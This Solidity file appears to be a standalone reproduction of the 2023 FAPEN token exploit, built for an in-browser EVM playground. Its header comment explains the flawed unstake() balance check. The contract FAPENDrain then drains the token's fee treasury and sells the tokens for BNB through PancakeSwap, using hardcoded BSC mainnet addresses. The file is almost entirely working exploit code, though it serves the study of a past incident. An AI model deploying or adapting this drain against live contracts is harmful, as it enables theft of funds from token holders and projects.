// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-FAPEN).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest` (attacker == address(this), no standalone exploit contract):
//
//   deal(address(this), 0);
//   FAPEN.unstake(FAPEN.balanceOf(address(FAPEN)));   // ⚠️ drains the contract's
//                                                      //    own fee treasury —
//                                                      //    unstake() checks
//                                                      //    balances[address(this)],
//                                                      //    not the caller's stake
//   FAPEN.approve(Router, type(uint256).max);
//   Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
//       FAPEN.balanceOf(address(this)), 0, [FAPEN, WBNB], address(this), block.timestamp
//   );
//
// `deal(address(this), 0)` is a no-op for a freshly deployed contract (native
// balance already 0), so it is omitted here. This file copies the inline
// attack verbatim into a standalone `run()` entrypoint so the in-browser EVM
// can deploy it and record the attack call.
//
// Root cause (FatherPepeInu.sol:106-111): `unstake(uint256 amount)` guards on
// `balances[address(this)] >= amount` — the CONTRACT's own balance (funded by
// the 1% transfer fee that piles up in balances[address(this)]) — then credits
// `balances[msg.sender] += amount`. There is no staking ledger anywhere in the
// contract (no `stake()`, no `staked[]` mapping), so the check never verifies
// that the caller deposited anything. Any address can call
// `unstake(balanceOf(address(this)))` and walk away with the entire
// accumulated fee treasury for free.

interface IFAPEN {
    function balanceOf(address account) external view returns (uint256);
    function unstake(uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FAPENDrain {
    IFAPEN internal constant FAPEN = IFAPEN(0xf3F1aBae8BfeCA054B330C379794A7bf84988228);
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IRouter internal constant ROUTER = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    /// @notice Recorded attack: drain the FAPEN contract's own fee treasury via
    ///         the backwards balance check in unstake(), then sell the
    ///         windfall through PancakeSwap for BNB.
    function run() external {
        // unstake() checks balances[address(this)] (the CONTRACT'S balance),
        // not any per-caller staked amount — so passing the contract's own
        // balance drains the entire accumulated fee treasury to msg.sender.
        FAPEN.unstake(FAPEN.balanceOf(address(FAPEN)));

        FAPEN.approve(address(ROUTER), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(FAPEN);
        path[1] = WBNB;

        ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(
            FAPEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}
